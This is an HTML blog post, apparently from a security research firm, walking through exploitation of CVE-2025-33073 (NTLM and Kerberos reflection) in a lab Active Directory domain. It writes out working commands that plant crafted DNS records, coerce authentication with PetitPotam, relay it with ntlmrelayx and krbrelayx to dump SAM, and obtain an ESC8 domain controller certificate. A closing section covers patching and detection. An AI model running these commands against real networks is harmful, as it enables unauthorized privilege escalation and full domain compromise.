@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Sysadmins in Shambles (CVE-2025-33073)</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Sysadmins in Shambles (CVE-2025-33073)" />
+<meta name="author" content="Zavier Lee" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://localhost:4000/sysadmins-in-shambles.html" />
+<meta property="og:url" content="http://localhost:4000/sysadmins-in-shambles.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-06-13T00:00:00-04:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Sysadmins in Shambles (CVE-2025-33073)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zavier Lee"},"dateModified":"2025-06-13T00:00:00-04:00","datePublished":"2025-06-13T00:00:00-04:00","headline":"Sysadmins in Shambles (CVE-2025-33073)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/sysadmins-in-shambles.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.png"},"name":"Zavier Lee"},"url":"http://localhost:4000/sysadmins-in-shambles.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=fb74e0ae5a4cf1b9a82aad5857f2af55afd32000">
+    <!--[if lt IE 9]>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <![endif]-->
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+  </head>
+  <body>
+    <div class="wrapper">
+      <header>
+        <h1><a href="http://localhost:4000/"> </a></h1>
+
+        
+          <img src="/assets/img/logo.png" alt="Logo" />
+        
+
+        <p> </p>
+
+        
+        <p class="view"><a href="https://github.com/ASYNC-Security/async-security.github.io">View the Project on GitHub <small>ASYNC-Security/async-security.github.io</small></a></p>
+        
+
+        
+
+        
+      </header>
+      <section>
+
+      <style>
+    .author-section {
+        padding: 14px;
+        margin: 16px 0;
+        background: rgba(255, 255, 255, 0.02);
+        border: 1px solid #444;
+        border-radius: 6px;
+        position: relative;
+    }
+
+    .author-label {
+        position: absolute;
+        top: -8px;
+        left: 12px;
+        background: #1a1a1a;
+        color: #4da6ff;
+        font-size: 0.75em;
+        font-weight: 600;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        padding: 0 6px;
+    }
+
+    .author-info {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+
+    .author-avatar {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        object-fit: cover;
+        box-shadow: 0 2px 6px rgba(77, 166, 255, 0.2);
+    }
+
+    .author-details {
+        flex: 1;
+    }
+
+    .author-name {
+        font-weight: 600;
+        color: white;
+        margin: 0 0 2px 0;
+        font-size: 0.95em;
+    }
+
+    .author-title {
+        color: #ccc;
+        font-size: 0.8em;
+        margin: 0 0 6px 0;
+        font-style: italic;
+    }
+
+    .author-links {
+        display: flex;
+        gap: 8px;
+    }
+
+    .social-link {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 28px;
+        height: 28px;
+        background: #333;
+        border-radius: 50%;
+        color: #ccc;
+        text-decoration: none;
+        transition: all 0.3s ease;
+        border: 1px solid #444;
+        font-size: 0.7em;
+    }
+
+    .social-link:hover {
+        color: #fff;
+        transform: translateY(-1px);
+        box-shadow: 0 4px 10px rgba(77, 166, 255, 0.3);
+    }
+
+    .post-meta {
+        color: #ccc;
+        font-size: 0.9em;
+        margin-bottom: 12px;
+    }
+
+    .toc-container {
+        margin: 24px 0;
+        background: rgba(255, 255, 255, 0.02);
+        border: 1px solid #444;
+        border-radius: 6px;
+        overflow: hidden;
+    }
+
+    .toc-toggle {
+        background: none;
+        border: none;
+        font-size: 1em;
+        font-weight: 500;
+        cursor: pointer;
+        width: 100%;
+        text-align: left;
+        padding: 16px;
+        color: #fff;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        transition: background-color 0.2s ease;
+    }
+
+    .toc-toggle:hover {
+        background: rgba(255, 255, 255, 0.05);
+    }
+
+    .toc-toggle::after {
+        content: '▼';
+        color: #999;
+        transition: transform 0.3s ease;
+        font-size: 0.8em;
+    }
+
+    .toc-toggle.expanded::after {
+        transform: rotate(180deg);
+    }
+
+    .toc-content {
+        display: none;
+        padding: 0 16px 16px 16px;
+        border-top: 1px solid #333;
+        background: rgba(0, 0, 0, 0.1);
+    }
+
+    .toc-content.expanded {
+        display: block;
+        animation: slideDown 0.3s ease-out;
+    }
+
+    @keyframes slideDown {
+        from {
+            opacity: 0;
+            transform: translateY(-10px);
+        }
+
+        to {
+            opacity: 1;
+            transform: translateY(0);
+        }
+    }
+
+    .toc-container a {
+        color: #ccc;
+        text-decoration: none;
+        transition: color 0.2s ease;
+    }
+
+    .toc-container a:hover {
+        color: #4da6ff;
+        text-decoration: underline;
+    }
+
+    .toc-container ol {
+        margin: 8px 0 0 0;
+        padding-left: 20px;
+        color: #ccc;
+    }
+
+    .toc-container ul {
+        margin: 4px 0;
+        padding-left: 20px;
+        color: #ccc;
+    }
+
+    .toc-container li {
+        margin: 6px 0;
+        line-height: 1.4;
+    }
+
+    @media (max-width: 962px) {
+        .toc-container {
+            margin: 16px 0;
+        }
+
+        .toc-toggle {
+            padding: 12px;
+            font-size: 0.95em;
+        }
+
+        .toc-content {
+            padding: 0 12px 12px 12px;
+        }
+    }
+
+    @media (max-width: 962px) {
+        .author-section {
+            margin: 16px 0;
+            padding: 16px;
+            border-radius: 6px;
+        }
+
+        .author-label {
+            top: -8px;
+            left: 12px;
+            font-size: 0.8em;
+        }
+
+        .author-info {
+            gap: 12px;
+        }
+
+        .author-avatar {
+            width: 48px;
+            height: 48px;
+            border-width: 2px;
+        }
+
+        .author-name {
+            font-size: 1em;
+        }
+
+        .author-title {
+            font-size: 0.9em;
+        }
+
+        .author-links {
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .post-meta {
+            margin-bottom: 8px;
+        }
+
+        h1 {
+            margin-top: 0;
+            margin-bottom: 10px;
+        }
+
+        section {
+            padding-top: 0 !important;
+        }
+
+        hr {
+            display: none;
+        }
+    }
+
+    .post-header {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-bottom: 28px;
+        flex-wrap: wrap;
+        gap: 12px;
+    }
+
+    .back-button {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        padding: 8px 12px;
+        background: rgba(255, 255, 255, 0.05);
+        border: 1px solid #444;
+        border-radius: 20px;
+        color: #ccc;
+        text-decoration: none;
+        font-size: 0.85em;
+        font-weight: 500;
+        transition: all 0.3s ease;
+        width: fit-content;
+        outline: none;
+    }
+
+    .back-button:hover {
+        background: rgba(255, 255, 255, 0.08);
+        color: #4da6ff;
+        border-color: #4da6ff;
+        transform: translateY(-1px);
+        box-shadow: 0 2px 8px rgba(77, 166, 255, 0.2);
+        outline: none;
+    }
+
+    .back-button:focus {
+        outline: none;
+        box-shadow: 0 0 0 2px rgba(77, 166, 255, 0.3);
+    }
+
+    .back-button svg {
+        width: 14px;
+        height: 14px;
+        transition: transform 0.3s ease;
+    }
+
+    .back-button:hover svg {
+        transform: translateX(-2px);
+    }
+
+    .post-meta {
+        color: #999;
+        font-size: 0.85em;
+        padding: 6px 12px;
+        background: rgba(255, 255, 255, 0.03);
+        border: 1px solid rgba(255, 255, 255, 0.08);
+        border-radius: 12px;
+        display: inline-block;
+        font-weight: 500;
+        letter-spacing: 0.3px;
+        margin: 0;
+    }
+
+    @media (max-width: 962px) {
+        .post-header {
+            flex-direction: column;
+            align-items: flex-start;
+            margin-bottom: 24px;
+            gap: 8px;
+        }
+
+        .back-button {
+            margin-top: 12px;
+            padding: 6px 10px;
+            font-size: 0.8em;
+        }
+
+        .back-button svg {
+            width: 12px;
+            height: 12px;
+        }
+
+        .post-meta {
+            font-size: 0.8em;
+            padding: 5px 10px;
+        }
+    }
+</style>
+
+<div class="post-header">
+    <a href="/" class="back-button">
+        <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+            <path fill-rule="evenodd"
+                d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z" />
+        </svg>
+        Back
+    </a>
+
+    
+    <small class="post-meta">13 June 2025</small>
+    
+</div>
+
+
+
+
+
+<div class="author-section">
+    <div class="author-label">Author</div>
+    <div class="author-info">
+        
+        <img src="./assets/img/authors/zavier.png" alt="Zavier Lee" class="author-avatar">
+        
+        <div class="author-details">
+            <div class="author-name">Zavier Lee</div>
+            
+            <div class="author-title">Offensive Security Engineer</div>
+            
+            <div class="author-links">
+                
+                <a href="https://x.com/gatariee" target="_blank" class="social-link twitter" aria-label="Twitter">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                        class="bi bi-twitter-x" viewBox="0 0 16 16">
+                        <path
+                            d="M12.6.75h2.454l-5.36 6.142L16 15.25h-4.937l-3.867-5.07-4.425 5.07H.316l5.733-6.57L0 .75h5.063l3.495 4.633L12.601.75Zm-.86 13.028h1.36L4.323 2.145H2.865z" />
+                    </svg>
+                </a>
+                
+                
+                <a href="https://github.com/gatariee" target="_blank" class="social-link github" aria-label="GitHub">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" />
+                    </svg>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<h1 id="sysadmins-in-shambles-cve-2025-33073">Sysadmins in Shambles (CVE-2025-33073)</h1>
+
+<p>Recently, a post by <a href="https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025">synacktiv</a> demonstrated the capabilities of <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-33073">CVE-2025-33073</a> which allows for an authenticated domain user to escalate to <code class="language-plaintext highlighter-rouge">NT AUTHORITY\SYSTEM</code> on any machine, given the following conditions:</p>
+
+<ul>
+  <li>The target machine must <code class="language-plaintext highlighter-rouge">not</code> have SMB Signing enabled.</li>
+  <li>The attacker <code class="language-plaintext highlighter-rouge">must</code> be able to create DNS records in the domain</li>
+</ul>
+
+<p>Both of which are default configurations in many Active Directory environments, with the exception of Domain Controllers which typically have SMB signing enabled by default.</p>
+
+<p>This post aims to highlight possible exploitation scenarios of this vulnerability, but will not go into detail about the vulnerability itself. For more information, please refer to the <a href="https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025">synacktiv post</a>.</p>
+
+<div class="toc-container">
+    <button class="toc-toggle" onclick="toggleToc()">Table of Contents</button>
+    <div class="toc-content" id="tocContent">
+        <ol>
+            <li>
+                <a href="#context">Context</a>
+            </li>
+            <li>
+                <a href="#reflecting-ntlm-to-self">Reflecting NTLM to Self</a>
+                <ul>
+                    <li><a href="#registering-dns">Registering DNS</a></li>
+                    <li><a href="#performing-the-relay">Performing the Relay</a></li>
+                </ul>
+            </li>
+            <li>
+                <a href="#reflecting...-kerberos">Reflecting... Kerberos?</a>
+            </li>
+            <li>
+                <a href="#reflecting-to-http-adcs">Reflecting to HTTP (ADCS)</a>
+                <ul>
+                    <li><a href="#kerberos-authentication-coercion">Kerberos Authentication Coercion</a></li>
+                    <li><a href="#relay-to-esc8">Relay to ESC8</a></li>
+                </ul>
+            </li>
+            <li>
+                <a href="#summary--patches">Summary &amp; Patches</a>
+            </li>
+            <li>
+                <a href="#mitigations--detections">Mitigations &amp; Detections</a>
+                <ul>
+                    <li><a href="#monitor-abnormal-dns-records">Monitor Abnormal DNS Records</a></li>
+                </ul>
+            </li>
+        </ol>
+    </div>
+</div>
+
+<h2 id="context">Context</h2>
+
+<p>The <code class="language-plaintext highlighter-rouge">PALACE-DC.jess.kingdom</code> domain controller has SMB signing enabled, and serves as the DNS server for the domain. The <code class="language-plaintext highlighter-rouge">SCRIPTORIUM.jess.kingdom</code> machine is a domain-joined machine that does not have SMB signing enabled. The attacker has the ability to create DNS records in the domain.</p>
+
+<p>Furthermore, the DC has Active Directory Certificate Services (ADCS) installed and is vulnerable to <code class="language-plaintext highlighter-rouge">ESC8</code>.</p>
+
+<p><img src="/assets/img/sysadmin/a4d122baa97922b1b76a927ba6ad855b.png" alt="ctx" /></p>
+
+<p>The attacker’s IP address is: <code class="language-plaintext highlighter-rouge">198.51.100.5</code>.</p>
+
+<h2 id="reflecting-ntlm-to-self">Reflecting NTLM to Self</h2>
+
+<blockquote>
+  <p>NTLM Reflection can be thought of as an NTLM relay to self, which should not be possible.</p>
+</blockquote>
+
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-33073">CVE-2025-33073</a> makes use of a maliciously crafted DNS record to coerce <code class="language-plaintext highlighter-rouge">LSASS.exe</code> (running as <code class="language-plaintext highlighter-rouge">SYSTEM</code>) into authenticating to an attacker-controlled server with a <code class="language-plaintext highlighter-rouge">SYSTEM</code> token. An example of such a hostname is <code class="language-plaintext highlighter-rouge">localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA</code> which will cause the server to perform “local” NTLM authentication to <code class="language-plaintext highlighter-rouge">localhost</code>.</p>
+
+<p>The above DNS record can be used “as-is” for all domain-joined machines because <code class="language-plaintext highlighter-rouge">localhost</code> always triggers the localhost detection logic, this relieves the attacker of having to create a DNS record for each machine they want to exploit. The attacker can simply create a DNS record with the hostname <code class="language-plaintext highlighter-rouge">localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA</code> and point it to their own IP address.</p>
+
+<p>The downside to this approach is that <code class="language-plaintext highlighter-rouge">Kerberos</code> authentication will not be possible, as the <code class="language-plaintext highlighter-rouge">Negotiate</code> package will choose <code class="language-plaintext highlighter-rouge">NTLM</code> over <code class="language-plaintext highlighter-rouge">Kerberos</code>. For the following attack, we will be targeting the <code class="language-plaintext highlighter-rouge">SCRIPTORIUM.jess.kingdom</code> machine.</p>
+
+<h3 id="registering-dns">Registering DNS</h3>
+
+<p>To register the DNS record, we can use <a href="https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py">dnstool.py</a>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/tools/krbrelayx/dnstool.py <span class="nt">-u</span> <span class="s1">'jess.kingdom\Doros_ARCHIVON'</span> <span class="nt">-p</span> <span class="s1">'bO3n21E6rc'</span> 10.3.20.31 <span class="nt">-a</span> <span class="s1">'add'</span> <span class="nt">-r</span> <span class="s1">'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'</span> <span class="nt">-d</span> <span class="s1">'198.51.100.5'</span>
+</code></pre></div></div>
+
+<p><img src="/assets/img/sysadmin/4bc6c836aad19d1fc0d0f88818028ae6.png" alt="" /></p>
+
+<p>Alternatively, we may register the DNS record for the particular machine:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/tools/krbrelayx/dnstool.py <span class="nt">-u</span> <span class="s1">'jess.kingdom\Doros_ARCHIVON'</span> <span class="nt">-p</span> <span class="s1">'bO3n21E6rc'</span> 10.3.20.31 <span class="nt">-a</span> <span class="s1">'add'</span> <span class="nt">-r</span> <span class="s1">'scriptorium1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'</span> <span class="nt">-d</span> <span class="s1">'198.51.100.5'</span>
+</code></pre></div></div>
+
+<p><img src="/assets/img/sysadmin/45eb12f51268946ed8d81899b105d65d.png" alt="" /></p>
+
+<p>After waiting for the DNS record to propagate, we can verify that the DNS record has been created:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/oops]
+└─$ dig localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.jess.kingdom @PALACE-DC.jess.kingdom
+...
+localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.jess.kingdom. 180 IN A 198.51.100.5
+...
+
+┌──(kali㉿kali)-[~/oops]
+└─$ dig SCRIPTORIUM1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.jess.kingdom @PALACE-DC.jess.kingdom
+...
+SCRIPTORIUM1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.jess.kingdom. 180 IN A 198.51.100.5
+...
+</code></pre></div></div>
+
+<h3 id="performing-the-relay">Performing the Relay</h3>
+
+<p>In a typical NTLM relay scenario, you could always coerce SMB authentication from a target machine using a tool such as <a href="https://github.com/topotam/PetitPotam">PetitPotam</a>. However, there are 2 problems: self-relay is not possible, and the relayed authentication will be from the machine account (<code class="language-plaintext highlighter-rouge">SCRIPTORIUM$</code>), which does not have local administrator privileges to themselves.</p>
+
+<p>Attempting to perform the relay traditionally will result in an authentication failure, as the target machine will attempt to authenticate to itself, which is not possible:</p>
+
+<p><img src="/assets/img/sysadmin/73bb8be82cadc18208525c84f0a9234f.png" alt="" /></p>
+
+<p><img src="/assets/img/sysadmin/5cb10b642304f7dc98b5d73b20d7018e.png" alt="" /></p>
+
+<p>However, coercing authentication to the maliciously crafted DNS name will “trick” the target machine into thinking that it’s authenticating to itself locally. Furthermore, a <code class="language-plaintext highlighter-rouge">SYSTEM</code> token will be used to authenticate, which will allow us to perform a SAM dump.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/tools/PetitPotam/PetitPotam.py -d 'jess.kingdom' -u 'Doros_ARCHIVON' -p 'bO3n21E6rc' localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA SCRIPTORIUM.jess.kingdom
+</code></pre></div></div>
+
+<p><img src="/assets/img/sysadmin/996bb389b60b87f2d8c7ea59625199b4.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmrelayx.py -t "smb://SCRIPTORIUM.jess.kingdom" -smb2support
+</code></pre></div></div>
+
+<p><img src="/assets/img/sysadmin/e2f4bbf744f90409282c62cb47eaee7f.png" alt="" /></p>
+
+<h2 id="reflecting-kerberos">Reflecting… Kerberos?</h2>
+
+<p>In the case that NTLM authentication is disabled on the forest, we can still use this primitive to relay authentication to the target machine using Kerberos. This can be done using <a href="https://github.com/dirkjanm/krbrelayx/blob/master/krbrelayx.py">krbrelayx.py</a> with slight modifications that can be found in the original blog post by <a href="https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025">synacktiv</a>.</p>
+
+<p>Attempting to relay Kerberos authentication using the <code class="language-plaintext highlighter-rouge">localhost</code> DNS record will not work as mentioned earlier.</p>
+
+<p><img src="/assets/img/sysadmin/dc582dc300d2d9654831f19cedef4211.png" alt="" /></p>
+
+<p><img src="/assets/img/sysadmin/54fb610dacfd1ccb4383fb0433c01401.png" alt="" /></p>
+
+<p>Instead, we need to use the malicious DNS record that we created for the specific machine (<code class="language-plaintext highlighter-rouge">SCRIPTORIUM1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA</code>):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/tools/PetitPotam/PetitPotam.py -d 'jess.kingdom' -u 'Doros_ARCHIVON' -p 'bO3n21E6rc' SCRIPTORIUM1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA SCRIPTORIUM.jess.kingdom
+</code></pre></div></div>
+
+<p><img src="/assets/img/sysadmin/9bde1d96aa87571714d805c247cc5a0f.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/tools/krbrelayx/krbrelayx.py -t 'SCRIPTORIUM.jess.kingdom' -smb2support
+</code></pre></div></div>
+
+<p><img src="/assets/img/sysadmin/51c4c28a026c5ee942446981394f79bc.png" alt="" /></p>
+
+<h2 id="reflecting-to-http-adcs">Reflecting to HTTP (ADCS)</h2>
+
+<blockquote>
+  <p>This primitive is not unique to CVE-2025-33073, and is possible as long as Kerberos authentication coercion can be made. See: <a href="https://www.thehacker.recipes/ad/movement/kerberos/relay#abuse-from-dns-poisoning">here</a></p>
+</blockquote>
+
+<p>If we attempt the same relay to the domain controller, we will not be able to perform the relay as the domain controller has SMB signing enabled. The following DNS record was also added:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/tools/krbrelayx/dnstool.py -u 'jess.kingdom\Doros_ARCHIVON' -p 'bO3n21E6rc' 10.3.20.31 -a 'add' -r 'palace-dc1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -d '198.51.100.5'
+</code></pre></div></div>
+
+<p><img src="/assets/img/sysadmin/Yet05Qi.png" alt="" /></p>
+
+<p>Traditionally, it’s not been possible to abuse ESC8 to compromise the Certificate Authority (CA) as the HTTP enrollment endpoint is on the CA - and that would be a violation of the “no self-relay” rule.</p>
+
+<p>However, as mentioned briefly in <a href="https://blog.async.sg/sincon-2025-adcs-relay.html">the previous blog post</a> - you can still relay to ESC8 using Kerberos. In addition to that, relaying with Kerberos breaks the “no self-relay” rule, as it does not contain a MIC. This allows us to compromise the <code class="language-plaintext highlighter-rouge">CA</code>, and the entire forest shortly after.</p>
+
+<h3 id="kerberos-authentication-coercion">Kerberos Authentication Coercion</h3>
+
+<p>Using the same technique as before, we can coerce Kerberos authentication to the domain controller using the malicious DNS record:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/tools/PetitPotam/PetitPotam.py -d 'jess.kingdom' -u 'Doros_ARCHIVON' -p 'bO3n21E6rc' palace-dc1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA palace-dc.jess.kingdom
+</code></pre></div></div>
+
+<p><img src="/assets/img/sysadmin/1.jpg" alt="" /></p>
+
+<h3 id="relay-to-esc8">Relay to ESC8</h3>
+
+<p>Now, we can relay the Kerberos authentication to the domain controller’s HTTP enrollment endpoint using <code class="language-plaintext highlighter-rouge">krbrelayx.py</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/tools/krbrelayx/krbrelayx.py --target 'http://PALACE-DC.jess.kingdom/certsrv/certfnsh.asp' --adcs --template 'DomainController' --victim 'PALACE-DC$'
+</code></pre></div></div>
+
+<p><img src="/assets/img/sysadmin/2.jpg" alt="" /></p>
+
+<p>Using the generated certificate, we can very simply compromise the forest (as the <code class="language-plaintext highlighter-rouge">CA</code> is also the <code class="language-plaintext highlighter-rouge">DC</code>).</p>
+
+<p><img src="/assets/img/sysadmin/3.jpg" alt="" /></p>
+
+<h3 id="summary--patches">Summary &amp; Patches</h3>
+
+<p>Details can be found at these links:</p>
+<ul>
+  <li><a href="https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025">https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025</a></li>
+  <li><a href="https://www.tenable.com/blog/microsofts-june-2025-patch-tuesday-addresses-65-cves-cve-2025-33053">https://www.tenable.com/blog/microsofts-june-2025-patch-tuesday-addresses-65-cves-cve-2025-33053</a></li>
+  <li><a href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html">https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html</a></li>
+  <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-33073">https://nvd.nist.gov/vuln/detail/CVE-2025-33073</a></li>
+</ul>
+
+<p>In order to mitigate this vulnerability, it is recommended to install the <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073">latest security updates</a> and enable SMB signing on all machines in the domain.</p>
+
+<p>Additionally, monitor for abnormal DNS record creation such as those with extremely long names and the string <code class="language-plaintext highlighter-rouge">localhost</code> in them. You may also find some lazy threat actors using the: <code class="language-plaintext highlighter-rouge">localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA</code> DNS record  name, so you can monitor for that as well.</p>
+
+
+<script>
+    function toggleToc() {
+        const content = document.getElementById('tocContent');
+        const button = document.querySelector('.toc-toggle');
+
+        if (content.classList.contains('expanded')) {
+            content.classList.remove('expanded');
+            button.classList.remove('expanded');
+            button.innerHTML = 'Table of Contents';
+        } else {
+            content.classList.add('expanded');
+            button.classList.add('expanded');
+            button.innerHTML = 'Table of Contents';
+        }
+    }
+</script>
+
+      </section>
+      <footer>
+        
+        <p>This project is maintained by <a href="https://github.com/ASYNC-Security">ASYNC-Security</a></p>
+        
+        <p><small>Hosted on GitHub Pages &mdash; Theme by <a href="https://github.com/orderedlist">orderedlist</a></small></p>
+      </footer>
+    </div>
+    <script src="/assets/js/scale.fix.js"></script>
+  </body>
+</html>
